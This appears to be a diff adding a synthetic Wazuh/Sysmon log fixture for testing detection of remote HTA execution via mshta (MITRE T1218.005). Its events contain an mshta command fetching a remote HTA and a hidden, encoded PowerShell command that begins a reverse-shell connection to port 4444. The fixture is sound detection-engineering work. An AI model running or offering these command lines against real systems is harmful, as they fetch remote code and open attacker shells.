@@ -1,0 +1,229 @@
+{
+  "_metadata": {
+    "attack_id": "T1218.005",
+    "variation": "001",
+    "name": "Remote HTA Execution via mshta",
+    "description": "mshta.exe executing HTA directly from malicious URL",
+    "expected_detection": "CRITICAL",
+    "kill_chain_phase": "execution",
+    "format": "wazuh-native",
+    "format_version": "1.0"
+  },
+  "logs": [
+    {
+      "_comment": "Sysmon Event 1 - mshta executing remote HTA",
+      "sequence": 1,
+      "timestamp": "2026-01-29T11:15:00.000Z",
+      "log": {
+        "rule": {
+          "level": 12,
+          "description": "Sysmon - Event 1: Remote HTA Execution via mshta",
+          "id": "100100",
+          "mitre": {
+            "id": [
+              "T1218.005"
+            ],
+            "tactic": [
+              "Execution"
+            ],
+            "technique": [
+              "Remote HTA Execution via mshta"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event1",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "020",
+          "name": "WS01",
+          "ip": "198.51.100.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1700000000.992311069",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "1",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local",
+              "level": "4",
+              "task": "1",
+              "opcode": "0",
+              "keywords": "0x8000000000000000",
+              "severityValue": "INFORMATION"
+            },
+            "eventdata": {
+              "utcTime": "2026-01-29 11:15:00.000",
+              "processGuid": "{MSHTA-001-0001-0001-000000000001}",
+              "processId": "9500",
+              "image": "C:\\Windows\\System32\\mshta.exe",
+              "commandLine": "mshta.exe http://198.51.100.100/update.hta",
+              "currentDirectory": "C:\\Users\\john.doe\\",
+              "user": "CORP\\john.doe",
+              "integrityLevel": "Medium",
+              "parentProcessGuid": "{MSHTA-001-0001-0001-000000000000}",
+              "parentProcessId": "9300",
+              "parentImage": "C:\\Windows\\System32\\cmd.exe",
+              "parentCommandLine": "cmd.exe"
+            }
+          }
+        }
+      }
+    },
+    {
+      "_comment": "Sysmon Event 3 - Network connection to fetch HTA",
+      "sequence": 2,
+      "timestamp": "2026-01-29T11:15:01.000Z",
+      "log": {
+        "rule": {
+          "level": 12,
+          "description": "Sysmon - Event 3: Remote HTA Execution via mshta",
+          "id": "100100",
+          "mitre": {
+            "id": [
+              "T1218.005"
+            ],
+            "tactic": [
+              "Execution"
+            ],
+            "technique": [
+              "Remote HTA Execution via mshta"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event3",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "020",
+          "name": "WS01",
+          "ip": "198.51.100.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1700000000.25288894",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "3",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local",
+              "level": "4",
+              "task": "1",
+              "opcode": "0",
+              "keywords": "0x8000000000000000",
+              "severityValue": "INFORMATION"
+            },
+            "eventdata": {
+              "utcTime": "2026-01-29 11:15:01.000",
+              "processGuid": "{MSHTA-001-0001-0001-000000000001}",
+              "processId": "9500",
+              "image": "C:\\Windows\\System32\\mshta.exe",
+              "user": "CORP\\john.doe",
+              "protocol": "tcp",
+              "initiated": "true",
+              "sourceIp": "198.51.100.50",
+              "sourcePort": "55500",
+              "destinationIp": "198.51.100.100",
+              "destinationPort": "80"
+            }
+          }
+        }
+      }
+    },
+    {
+      "_comment": "Sysmon Event 1 - mshta spawns PowerShell",
+      "sequence": 3,
+      "timestamp": "2026-01-29T11:15:02.000Z",
+      "log": {
+        "rule": {
+          "level": 12,
+          "description": "Sysmon - Event 1: Remote HTA Execution via mshta",
+          "id": "100100",
+          "mitre": {
+            "id": [
+              "T1218.005"
+            ],
+            "tactic": [
+              "Execution"
+            ],
+            "technique": [
+              "Remote HTA Execution via mshta"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event1",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "020",
+          "name": "WS01",
+          "ip": "198.51.100.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1700000000.582292934",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "1",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local",
+              "level": "4",
+              "task": "1",
+              "opcode": "0",
+              "keywords": "0x8000000000000000",
+              "severityValue": "INFORMATION"
+            },
+            "eventdata": {
+              "utcTime": "2026-01-29 11:15:02.000",
+              "processGuid": "{MSHTA-001-0001-0001-000000000002}",
+              "processId": "9600",
+              "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+              "commandLine": "powershell.exe -nop -w hidden -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQA5ADIALgAxADYAOAAuADUAMAAuADEAMAAwACcALAA0ADQANAA0ACkA",
+              "currentDirectory": "C:\\Users\\john.doe\\",
+              "user": "CORP\\john.doe",
+              "integrityLevel": "Medium",
+              "parentProcessGuid": "{MSHTA-001-0001-0001-000000000001}",
+              "parentProcessId": "9500",
+              "parentImage": "C:\\Windows\\System32\\mshta.exe",
+              "parentCommandLine": "mshta.exe http://198.51.100.100/update.hta"
+            }
+          }
+        }
+      }
+    }
+  ]
+}
